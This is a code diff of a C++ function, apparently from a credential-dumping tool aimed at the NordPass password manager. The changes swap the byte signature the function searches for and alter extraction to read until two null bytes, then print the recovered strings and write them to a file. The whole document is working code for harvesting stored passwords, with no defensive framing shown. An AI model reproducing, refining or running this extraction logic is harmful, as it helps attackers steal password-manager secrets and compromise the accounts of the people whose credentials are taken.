@@ -12,7 +12,7 @@ int getCredsnordpass1(std::string filename) {
         return 1;
     }
 
-    std::vector<unsigned char> searchPattern = { 0x00, 0x9d, 0x05, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00 };
+    std::vector<unsigned char> searchPattern = { 0x2f, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20 };
     std::vector<unsigned char> foundData;
 
     while (!file.eof()) {
@@ -22,11 +22,22 @@ int getCredsnordpass1(std::string filename) {
         if (c == searchPattern[foundData.size()]) {
             foundData.push_back(c);
             if (foundData.size() == searchPattern.size()) {
-                // We found the search pattern, now collect the next 50 characters
+                // We found the search pattern, now collect data until two binary spaces were found (00)
                 std::vector<unsigned char> extractedData;
-                
-                for (int i = 0; i < 50 && !file.eof(); ++i) {
+                int consecutiveSpaces = 0;
+
+                while (!file.eof()) {
                     file.read(reinterpret_cast<char*>(&c), sizeof(c));
+                    if (c == 0x00) {
+                        consecutiveSpaces++;
+                        if (consecutiveSpaces == 2) {
+                            break; // Two consecutive binary spaces found
+                            // We can check for more spaces if we want
+                        }
+                    }
+                    else {
+                        consecutiveSpaces = 0;
+                    }
                     extractedData.push_back(c);
                 }
 
@@ -34,14 +45,15 @@ int getCredsnordpass1(std::string filename) {
                 std::string utf8ExtractedData(extractedData.begin(), extractedData.end());
 
                 // Print the extracted UTF-8 string
-                std::cout << "Extracted Data: " << utf8ExtractedData << std::endl;
+                std::cout << utf8ExtractedData << std::endl;
 
-                // Save into file
+                //Save into file
                 saveFile(utf8ExtractedData);
 
                 foundData.clear();
             }
-        } else {
+        }
+        else {
             foundData.clear();
         }
     }
